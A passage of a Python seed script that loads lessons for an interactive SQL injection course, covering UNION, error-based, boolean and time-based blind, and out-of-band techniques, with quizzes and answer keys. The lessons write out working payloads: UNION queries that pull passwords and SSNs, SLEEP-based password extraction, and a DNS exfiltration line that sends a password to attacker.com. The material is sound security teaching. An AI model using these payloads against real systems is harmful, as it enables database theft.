    db.session.add(LessonStep(lesson_id=l3_7.id, order_index=1, kind="sandbox", title="SANDBOX (Capstone Challenge)", prompt="The `secret_note` column isn't displayed on the page. Craft an injection that makes the search results include the `secret_note` column.\\n1. *The search wraps your input in `%..%`. You need to escape from the LIKE clause first.*\\n2. *Think about UNION SELECT — it lets you combine results from two queries.*\\n3. *Try: `%' UNION SELECT id, name, price, secret_note FROM products--`*\\n**Expected Solution**:\\n```\\nSearch input: %' UNION SELECT id, name, price, secret_note FROM products--\\n```\\n**Resulting query**:\\n```sql\\nSELECT * FROM products WHERE name LIKE '%%' UNION SELECT id, name, price, secret_note FROM products--'\\n```\\n**On success**: Shows the secret_note column data. 🎉 \"You just performed data exfiltration using UNION-based SQL injection!\"\\n---\\n## Module 3 Summary\\n| Concept | Key Takeaway |\\n|---------|-------------|\\n| String escape | `'` breaks out of the data context into code context |\\n| Auth bypass | `admin'--` skips password validation |\\n| OR 1=1 | Always-true condition returns all rows |\\n| Comment syntax | `--`, `#`, `/* */` — varies by database |\\n| Probing | Single quotes and boolean tests detect injectability |\\n| UNION injection | Combine queries to extract hidden data |\\n**Teaser for Module 04**: *You've learned the classic injection. But what if the app doesn't show you any error messages or data? Blind SQL injection techniques let you extract data even when you can't see the results directly...*", options=_j([]), correct_answer="", explanation="", hints=_j([""])))

    # ── MODULE 04: Types of SQL Injection ──────────────────────────────────
    m4 = Module(order_index=4, title="Types of SQL Injection", description=DESCRIPTIONS.get(4, ""), icon=ICONS.get(4, "database"), difficulty="Intermediate", estimated_minutes=25)
    db.session.add(m4)
    db.session.flush()
    l4_1 = Lesson(module_id=m4.id, order_index=1, title="The Three Families (Concept)", narrative="**Narrative**: *Not all SQL injections work the same way. The technique you use depends on what the application **shows you back**. Think of it as three levels of visibility:*\\n**Interactive Visual**: Three doors, student clicks each to reveal details", code_snippet="╔═══════════════════╗  ╔═══════════════════╗  ╔═══════════════════╗\\n║   🔓 IN-BAND      ║  ║   🔒 BLIND         ║  ║   📡 OUT-OF-BAND  ║\\n║                   ║  ║                   ║  ║                   ║\\n║  You can SEE the  ║  ║  You can't see    ║  ║  Data is sent to  ║\\n║  results directly ║  ║  results, but can ║  ║  an external      ║\\n║  on the page.     ║  ║  infer YES/NO.    ║  ║  server you       ║\\n║                   ║  ║                   ║  ║  control.          ║\\n║  • Error-based    ║  ║  • Boolean-based  ║  ║                   ║\\n║  • UNION-based    ║  ║  • Time-based     ║  ║  • DNS exfil      ║\\n║                   ║  ║                   ║  ║  • HTTP exfil      ║\\n╚═══════════════════╝  ╚═══════════════════╝  ╚═══════════════════╝\\n     EASY → → → → → → → MEDIUM → → → → → → → → → ADVANCED", code_language="", table_data=None)
    db.session.add(l4_1)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_1.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="You inject a single quote `'` into a search field and the page displays:\\n```\\nError: Unterminated string literal at position 42\\n```\\nWhich type of SQL injection is this?", options=_opts(("A", "A) In-Band (Error-based)"), ("B", "B) Blind (Boolean-based)"), ("C", "C) Blind (Time-based)"), ("D", "D) Out-of-Band")), correct_answer="\"A\"", explanation="The application is directly showing you the database error. This is In-Band, Error-based injection. The error message gives you direct feedback about your injection's effect.", hints=_j([])))
    l4_2 = Lesson(module_id=m4.id, order_index=2, title="In-Band: Error-Based Injection", narrative="**Narrative**: *Error-based injection is the attacker's favorite — the application literally tells you what went wrong. You can extract data by intentionally causing errors that include database information.*\\nThe database version is leaked inside the error message!", code_snippet="-- MySQL: EXTRACTVALUE forces an XPath error that includes query results\\n' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --\\n\\n-- Error response:\\n-- XPATH syntax error: '~5.7.34-0ubuntu0.18.04.1'", code_language="sql", table_data=None)
    db.session.add(l4_2)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_2.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="An attacker injects this into a vulnerable MySQL field:\\n```sql\\n' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1))) --\\n```\\nWhat kind of information will appear in the error?", options=_opts(("A", "A) The server's IP address"), ("B", "B) The name of the first table in the database"), ("C", "C) All data from all tables"), ("D", "D) The application's source code")), correct_answer="B) The name of the first table in the database", explanation="`EXTRACTVALUE` forces an error that includes the result of the subquery. `information_schema.tables` contains metadata about all tables. `LIMIT 1` returns just the first table name.", hints=_j([])))
    l4_3 = Lesson(module_id=m4.id, order_index=3, title="In-Band: UNION-Based Injection", narrative="**Narrative**: *UNION injection is the most powerful in-band technique. It lets you **append your own query** to the original, stealing data from any table.*\\n**The Rules of UNION**:\\n1. The number of columns in your query must **match** the original query\\n2. The data types should be **compatible**\\n**Step-by-step approach**:", code_snippet="Step 1: Find the number of columns\\n  ' ORDER BY 1--   ✅ works\\n  ' ORDER BY 2--   ✅ works  \\n  ' ORDER BY 3--   ✅ works\\n  ' ORDER BY 4--   ❌ error! → Original query has 3 columns\\n\\nStep 2: Find which columns are displayed\\n  ' UNION SELECT 'aaa','bbb','ccc'--\\n  → See where 'aaa', 'bbb', 'ccc' appear on the page\\n\\nStep 3: Extract data through visible columns\\n  ' UNION SELECT username, password, email FROM users--", code_language="", table_data=None)
    db.session.add(l4_3)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_3.id, order_index=1, kind="sandbox", title="SANDBOX (Guided)", prompt="", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    db.session.add(LessonStep(lesson_id=l4_3.id, order_index=2, kind="build", title="BUILD THE QUERY", prompt="You know a table `employees` has columns `first_name`, `salary`, and `ssn`. The original query has 3 columns. Build a UNION injection to extract all employee SSNs.\\n**Fragments available** (drag to build):\\n```\\n' UNION          SELECT          first_name,          salary,\\nssn              FROM            employees            --\\n```\\n**Correct assembly**:\\n```sql\\n' UNION SELECT first_name, salary, ssn FROM employees--\\n```", options=_j([]), correct_answer="", explanation="*The UNION must have exactly 3 columns to match the original query. We select the three columns we're interested in from the `employees` table.*\\n---", hints=_j([])))
    l4_4 = Lesson(module_id=m4.id, order_index=4, title="Blind: Boolean-Based Injection", narrative="**Narrative**: *What if the application doesn't show errors or query results? You can still extract data by asking the database yes-or-no questions and watching how the page behaves.*\\n**The Concept**: Instead of seeing data directly, you observe:\\n- **TRUE condition** → Page loads normally (e.g., \"Product found\")\\n- **FALSE condition** → Page changes (e.g., \"No results\" or blank page)\\n*Slowly, character by character: `a`, `s`, `e`, `c`, `r`, `e`, `t` → Password is `asecret`*", code_snippet="-- Is the first character of admin's password 'a'?\\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --\\n→ Page loads normally = YES ✅\\n\\n-- Is the second character 'b'?  \\n' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin') = 'b' --\\n→ Page is blank = NO ❌\\n\\n-- Is the second character 's'?\\n' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin') = 's' --\\n→ Page loads normally = YES ✅", code_language="sql", table_data=None)
    db.session.add(l4_4)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_4.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="An attacker sends these three requests to a search page:\\n```\\nRequest 1: ' AND 1=1--     → Page shows \"Results found\"\\nRequest 2: ' AND 1=2--     → Page shows \"No results\"\\nRequest 3: ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8-- → Page shows \"Results found\"\\n```\\nWhat has the attacker just learned?", options=_opts(("A", "A) The admin's password is 8 characters long"), ("B", "B) The admin's password is \"12345678\""), ("C", "C) There are 8 users in the database"), ("D", "D) The password column has 8 rows")), correct_answer="A) The admin's password is 8 characters long", explanation="Request 1 & 2 confirm Boolean-based blind injection works (true vs false produces different responses). Request 3 asks \"Is the password length equal to 8?\" and gets a \"true\" response. The admin password is 8 characters long.", hints=_j([])))
    l4_5 = Lesson(module_id=m4.id, order_index=5, title="Blind: Time-Based Injection", narrative="**Narrative**: *Sometimes the page looks **exactly the same** regardless of true or false. No errors, no different content. In this case, we weaponize **time**.*\\n**The Concept**: We ask the database to **sleep** if a condition is true:\\n- **TRUE** → Response takes 5+ seconds\\n- **FALSE** → Response is instant", code_snippet="-- MySQL: Does the admin password start with 'a'?\\n' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--\\n\\n-- If response takes 5 seconds → YES, first character is 'a'\\n-- If response is instant → NO, try next character", code_language="sql", table_data=None)
    db.session.add(l4_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_5.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="You send this payload and the server takes exactly 5 seconds to respond:\\n```sql\\n' AND IF(1=1, SLEEP(5), 0)--\\n```\\nYou then send this and get an instant response:\\n```sql\\n' AND IF(1=2, SLEEP(5), 0)--\\n```\\nWhat can you conclude?", options=_opts(("A", "A) The server is slow"), ("B", "B) The field is vulnerable to time-based blind injection"), ("C", "C) The SLEEP function is not supported"), ("D", "D) The application detected and blocked the injection")), correct_answer="\"B\"", explanation="The first payload (true condition) caused a 5-second delay, while the second (false condition) returned instantly. This confirms you can control the database's execution time based on conditions — time-based blind injection is possible.", hints=_j([])))
    l4_6 = Lesson(module_id=m4.id, order_index=6, title="Out-of-Band (OOB) Injection", narrative="**Narrative**: *Out-of-Band injection is the rarest technique. Instead of extracting data through the same HTTP response, you make the database server send data to a server you control via DNS or HTTP.*\\n**When to use OOB**:\\n- When in-band and blind techniques don't work\\n- When the database has outbound network access\\n- When you need faster extraction than time-based", code_snippet="-- MySQL: DNS exfiltration\\n' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a'))--\\n\\n-- The database makes a DNS request to:\\n-- asecret.attacker.com\\n-- The attacker reads the password from their DNS logs!", code_language="sql", table_data=None)
    db.session.add(l4_6)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l4_6.id, order_index=1, kind="dnd", title="DRAG & DROP (Classification)", prompt="Classify each scenario into the correct SQL injection type:\\n**Scenarios**:\\n1. \"The page shows a database error with table names\" → **Error-based (In-Band)**\\n2. \"The page shows the same content but takes 10 seconds\" → **Time-based (Blind)**\\n3. \"The search results include data from a different table\" → **UNION-based (In-Band)**\\n4. \"The page shows 'Results found' or 'No results'\" → **Boolean-based (Blind)**\\n5. \"The database sends a DNS request to the attacker's server\" → **Out-of-Band**\\n**Student drags** each scenario into one of three bins: In-Band, Blind, Out-of-Band\\n---", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    l4_7 = Lesson(module_id=m4.id, order_index=7, title="Decision Flowchart", narrative="**Interactive Decision Tree** (student clicks through):", code_snippet="START: Can you see query results on the page?\\n  │\\n  ├── YES → Can you use UNION to append queries?\\n  │          ├── YES → Use UNION-based injection\\n  │          └── NO  → Use Error-based injection\\n  │\\n  └── NO → Does the page behavior change based on true/false conditions?\\n            ├── YES → Use Boolean-based blind injection\\n            └── NO  → Does injecting SLEEP cause a time delay?\\n                       ├── YES → Use Time-based blind injection\\n                       └── NO  → Try Out-of-Band techniques", code_language="", table_data=None)
    db.session.add(l4_7)
